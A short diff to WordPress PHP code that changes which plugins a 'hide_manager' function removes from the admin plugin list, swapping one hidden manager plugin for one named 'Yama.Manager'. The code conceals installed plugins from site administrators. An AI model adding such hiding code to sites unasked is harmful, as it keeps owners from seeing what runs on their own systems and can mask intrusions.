@@ -121,7 +121,7 @@ add_action('wp_before_admin_bar_render','remove_admin_bar_links',999);
 //Hide Managing Plugins
 function hide_manager(){
 	global $wp_list_table;
-	$hidearr=array('worker/init.php','shs-manager/manager.php');
+	$hidearr=array('worker/init.php','Yama.Manager/manager.php');
 	$myplugins=$wp_list_table->items;
 	foreach($myplugins as $key => $val){if(in_array($key,$hidearr)){unset($wp_list_table->items[$key]);}}
 }
